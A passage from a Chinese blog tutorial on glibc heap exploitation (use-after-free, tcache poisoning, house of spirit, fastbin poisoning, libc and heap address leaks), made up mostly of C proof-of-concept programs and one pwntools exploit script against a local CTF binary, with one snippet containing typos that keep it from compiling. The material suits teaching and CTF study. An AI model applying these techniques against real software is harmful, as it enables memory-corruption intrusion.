漏洞主要是后两种。此外，我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer （它的中文翻译叫迷途指针😊）。</p><p>它的实际应用就是我们在像是 chunk extend 里面用到的示例2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">void</span> *ptr1,*ptr2,*ptr3;<br>    ptr1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);      <span class="hljs-comment">//防止与top chunk合并</span><br>    <br>    <span class="hljs-built_in">free</span>(ptr1);<br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr1<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0xb1</span>;  <span class="hljs-comment">// Use After Free</span><br>    ptr3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);  <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Tcache-attack"><a href="#Tcache-attack" class="headerlink" title="Tcache attack"></a>Tcache attack</h1><blockquote><p>这一部分我的环境是Ubuntu18 libc2.27</p></blockquote><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>Tcache 全名为 Thread Local Caching，在 libc2.26 之后才出现。它为每个线程创建一个缓存，里面包含了一些小堆块。</p><p>Tcache bin 是单链表的数据结构，存储相同大小的空闲堆块，size大小范围是 0x20-0x410，允许存放的 chunk 数为7。当你使用 <code>free()</code> 函数释放一个堆块时，glibc 会将该堆块放入适当大小类别的 Tcache bin 中，以备后续再次分配。Tcache bin 采用先进后出的策略，且 prev_inuse 位不会被合并，也就是说 tcache bin 中的 chunk 不会被合并。</p><h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p>在有了 tcache 机制以后，无论是分配还是释放堆块，tcache 都是首先被利用的，直到达到每一中 bin 的上限 7 为止。还有一种情况就是 fast bin 或者 small bin 返回了一个堆块，且 tcache 对应大小的 bin 中未满的话，那么该fast bin 或者 samll bin 链中的堆块会被加入到对应 tcache bin 中直至其上限。</p><h4 id="绕过-Tcache"><a href="#绕过-Tcache" class="headerlink" title="绕过 Tcache"></a>绕过 Tcache</h4><p>Tcache 机制无非就是增加了一层缓存，绕过 Tcache 就是我们手动构造填充堆块填满某一个大小对应的 thcache bin 链表，使得在再次回收的 bin 进入unsorted bin 或者 small bin，large bin 等等，再利用这些 bin 得到 libc 基址。</p><p>原理大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr[<span class="hljs-number">7</span>];<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br><span class="hljs-comment">// 申请7个，释放7个，填满tcache bin[0x90]</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)<br>        ptr[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++)<br>        <span class="hljs-built_in">free</span>(ptr[i]);<br>    <span class="hljs-comment">// 这里再释放a，就会放入到unsorted bin中</span><br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;libc addr is %llx\n&quot;</span>,  *(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span>*)a);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/thcache-bypass.png"></p><p>如上我们就泄露出了 main_arena 的地址，接下来就可以通过ret2libc时用到的套路泄露libc基址进而调用目标函数啦。</p><h4 id="分配堆到指定的地址"><a href="#分配堆到指定的地址" class="headerlink" title="分配堆到指定的地址"></a>分配堆到指定的地址</h4><p>在堆的利用中，我们经常会需要把堆的指针分配到我们想要的地址上去，比如BSS段或者直接指向栈空间实现程序流的操控，抑或是将堆块重新分配。</p><p>我们可以通过以下几种方法实现：</p><h5 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h5><p>tcache poisoning的利用思路如下：</p><ul><li><p>分配一个目标大小的堆块，再将其释放</p></li><li><p>利用堆溢出等漏洞，将刚刚释放的堆块的某个指针（例如 <code>fd</code> 或 <code>bk</code> ）修改为我们可控的地址指针（如 <code>__free_hook </code>或 <code>__malloc_hook</code> 等局部变量的地址）。</p></li><li><p>再次建立相同大小的堆块并释放，这样该堆块的内容会被认为是一个有效的 tcache 链表节点。</p></li><li><p>再次建立相同大小的堆块，此时 tcache 会将之前填充的目标指针地址作为返回值返回给调用者，我们可以在这段地址内写入攻击代码，程序执行到目标地址，就可以实现任意代码执行。</p><blockquote><p>因为 fd 指针会返回空闲堆块地址给程序，而这个地址被我们替换成了目标地址，所以实际上返回值是目标地</p></blockquote></li></ul><p> 原理大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> localVariables ;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;localVariables addr is %p\n&quot;</span>, &amp;localVariables);<br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc ptr addr is %p\n&quot;</span>, ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-comment">// 只需修改fd指针，申请的大小和当前tcache bin大小相同即可</span><br>    ptr[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)&amp;localVariables;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the second malloc addr is %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcachePoisoning.png"></p><h5 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h5><p>tcache house of spirit 这种利用方式是由于 tcache_put() 函数检查不严格导致的，在释放的时候没有检查被释放的指针是否真的是堆块的 malloc 指针，我们就可以伪造一个 fake_chunk 来跳转到目标地址。</p><p>利用思路是伪造一个 size 符合 tcache bin size 的 fake_chunk ，使程序在释放时误以为他们属于 tcache 的管理范围，就实现了任意地址的目的的。</p><p>原理大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);  <span class="hljs-comment">// 初始化堆环境</span><br>    <br>    <span class="hljs-comment">// 伪造假堆块，试图释放后再次分配得到该地址的堆块</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fck addr is %p\n&quot;</span>, fck+<span class="hljs-number">2</span>);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x90</span>;<br>    <span class="hljs-built_in">free</span>(fck+<span class="hljs-number">2</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;now malloc addr is %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcacheHouseOfSpirit.png"></p><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>在做堆题时，经常会遇到保护全开的情况，特别是地址随机化保护PIE，或者题目本身没有明显可利用的打印函数，这时就需要采取一些机制来泄露出libc地址或者堆地址等。</p><h5 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h5><p>泄露 libc 利用的就是 bin 中双向链表的性质，当一个堆块被加入链表时，它的 fd 和 bk 指针会指向 libc 中的地址。在“绕过 tcache”中我们就是利用了这个特性来泄露的 libc 地址。</p><p>还有更加直接的方法，只需要让分配和释放的chunk 大于等于 0x410字节（超过 tcache 的范围）即可。需要注意的是，这时我们需要防止释放的堆块和 top chunk 合并。</p><p>原理大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> * ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x410</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);  <span class="hljs-comment">// 防止堆块合并</span><br>    <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">//释放的堆块进入 unsorted bin</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak libc addr is %p\n&quot;</span>, (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcachelibc.png"></p><h5 id="泄露-heap-地址"><a href="#泄露-heap-地址" class="headerlink" title="泄露 heap 地址"></a>泄露 heap 地址</h5><p>除了泄露 libc 地址，我们还可以泄露 heap 地址。在泄露堆地址以后，我们确定好目标地址的偏移，再通过修改 tcache bin 的 fd 指针，就可以在下次分配时分配到我们想要的堆块。</p><blockquote><p>在 libc-2.28 中，增加了对 tcache 二次释放的检查，所以此种攻击方法在 libc-2.28 及其更高版本中失效</p></blockquote><p>原理大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-built_in">free</span>(ptr);  <span class="hljs-comment">// double free !!</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;heap addr is %p\n&quot;</span>, ptr[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>double free 错误提示了，换了三个版本的 Libc 都木有用，先放着碰到题目再说🫥</p></blockquote><p>还有另一种方法，我们利用 malloc 不会清除内存空间的特性以及 printf 格式化字符串遇到字符 “\x00” 才会停止的特性去泄露 heap base 。</p><p>题目示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    read(<span class="hljs-number">0</span>, p3, <span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, p3);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>p = process(<span class="hljs-string">&quot;./heap&quot;</span>)<br>p.send(<span class="hljs-string">&quot;a&quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br><span class="hljs-built_in">print</span>(info)<br>info = u64(info.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br>heap_base = info &amp; <span class="hljs-number">0xfffffffffffff000</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;heap base: &quot;</span>, <span class="hljs-built_in">hex</span>(heap_base))<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcacheheap_exp.png"></p><h5 id="利用-tcache-bin-记录堆块泄露地址"><a href="#利用-tcache-bin-记录堆块泄露地址" class="headerlink" title="利用 tcache bin 记录堆块泄露地址"></a>利用 tcache bin 记录堆块泄露地址</h5><p>有的时候题目会限制free的次数，我们无法通过多次释放来填满 tcache bin 。这种情况我们就可以结合 tcache bin 的特性。我们知道，在初始化堆的时候， tcache bin 会生成一块 0x250 大小的堆块来记录属于 tcache bin 大小的堆块信息。我们修改这里的记录，就可以把后续释放的堆块放进 unsorted bin 中。</p><p>方法一：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr;<br><br>    ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br><br>    <span class="hljs-comment">// double free</span><br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-built_in">free</span>(ptr);<br><br>    <span class="hljs-comment">// malloc 3 ==&gt; tcache bin count = -1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>上方代码中，我们通过利用 double free 让一个堆块自身构成循环，然后 malloc 3次后就可以让 tcache bin 的记录变为 -1，由于 libc 源代码是认定为无符号整型所以此时也就是一个非常大的数，自然也就认为该 tcache bin 是被填满了的。最后再 free 相同大小的堆块，就会被释放到相应的bin中。<br>方法二：</p><p>直接修改记录信息。利用double free泄露出heap地址，计算偏移并求出记录该tcache bin的地址，然后利用tcache bin poison将堆块分配到这里进行修改。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;srdlb.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr;<br>    <br>    ptr = malooc(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<br>    ptr[<span class="hljs-number">-74</span>]=<span class="hljs-number">0x0700000000000000</span>;    <span class="hljs-comment">//这里是我们自己计算出的偏移</span><br>    <span class="hljs-built_in">free</span>(ptr);<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>上方代码中我们将记录块修改为0x07这样就会被认为是已经填满了七块堆块，下一个 free 掉的堆块就会进入相应的区域。</p><h4 id="tcache-extend"><a href="#tcache-extend" class="headerlink" title="tcache extend"></a>tcache extend</h4><p>其实就是我们可以通过释放堆块后对其数据进行修改。其中由于tcache机制的加入使得漏洞利用更简单。chunk extend 也更加的轻松，只需要修改当前chunk的size，我们free再malloc后就可以获得对应大小的chunk。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr is %p, size is %p\n&quot;</span>, p1, p1[<span class="hljs-number">-1</span>]);<br>    p1[<span class="hljs-number">-1</span>] = <span class="hljs-number">0xa1</span>;<br>    <span class="hljs-built_in">free</span>(p1);<br>    p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;addr is %p, size is %p\n&quot;</span>, p1, p1[<span class="hljs-number">-1</span>]);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/tcache_extend2.png"></p><h1 id="Fastbin-attack"><a href="#Fastbin-attack" class="headerlink" title="Fastbin attack"></a>Fastbin attack</h1><blockquote><p>这一部分我的环境是 ubuntu16 libc2.23</p></blockquote><p>简单回顾一下 fast bin 的特性：</p><ul><li>属于fast bin 的 chunk 大小在 64 位下是 0x20-0x80，每一条 bin 链表以 0x10 递增，共计七条链；32 位是 0x10-0x40 ，以 0x8 递增。</li><li>fast bin 是单链表且先进后出，就是说在 fast bin 中只有 fd 指针会被使用。</li><li>属于 fast bin 的 chunk 被释放时不会被 unlink ，不会和堆块进行合并，即使紧邻 Top chunk。</li></ul><h3 id="fast-bin-posioning"><a href="#fast-bin-posioning" class="headerlink" title="fast bin posioning"></a>fast bin posioning</h3><blockquote><p>其实和之前 tcache 的方法是一样的，只不过我们现在的环境是 libc2.23 没有 tcache😊</p></blockquote><p>这种攻击方法的目的就是将堆块分配到我们想要控制的内存区域，再通过题目所给的编辑堆块的功能来修改这一部分的内存区域。</p><p>实现攻击目标，首先要在目标区域为造出一个堆块，将伪造堆块的size大小设置为要申请的chunk大小+0x10，然后将伪造堆块的地址填入对应大小的bin链中，之后正常申请堆块即可。</p><p>大致原理如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fck[<span class="hljs-number">4</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stack addr is %p\n&quot;</span>, fck);<br><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">free</span>(ptr);<br>    fck[<span class="hljs-number">1</span>] = <span class="hljs-number">0x21</span>;           <br>    ptr[<span class="hljs-number">0</span>] = (<span class="hljs-type">long</span> <span class="hljs-type">long</span>)fck;  <span class="hljs-comment">//把fck指针写入fd指针</span><br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the original heap %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;alloc to the stack %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>));<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastbp.png"></p><p>如上代码，我们修改了 fd 指针，使得 fd 指针指向了 ptr[0]。这样我们再次分配大小为 0x10 的堆块时，会从被修改的 fd 指针指向的地址处获取堆块，并返回给我们。</p><p><img src="/img/%E5%A0%86%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-%E4%B8%80/fastbp_gdb1.png"></p><blockquote><p>因为我们写入到 fd 指针的是 fck 的地址，也就是伪造堆块的头地址，而 malloc 返回的是用户数据地址，所以两个地址相差0x10</p></blockquote><h3 id="fast-bin-house-of-spirit"><a href="#fast-bin-house-of-spirit" class="headerlink" title="fast bin house of spirit"></a>fast bin house of spirit</h3><p>House of Spirit 这种技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p><p>我们需要注意的是，系统对 chunk 会有相应的检查，我们需要绕过检查。相关数据如下：</p><ul><li><p>fake chunk 的 IS_MAPPED 不能为 1</p><p>这个标志位位于size低二比特位。标志位是 1 代表堆块由 mmap 分配，而 mmap 分配的堆块不进入 fast bin 管理。</p></li><li><p>地址对齐</p><p>比如32位程序的话fake_chunk的prev_size所在地址就应该位 <code>0xXXXX0</code> 或 <code>0xXXXX4</code>。64位的话地址就应该在 <code>0xXXXX0</code> 或 <code>0xXXXX8</code> 。</p></li><li><p>大小对齐</p><p>需要满足 fsat bin 的尺寸要求，大小不能大于0x80。</p></li><li><p>next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于 av-&gt;system_mem</p><p>最大不能超过 av-&gt;system_mem ，即 128kb。next_chunk 的大小一般我们会设置成为一个超过 fast bin 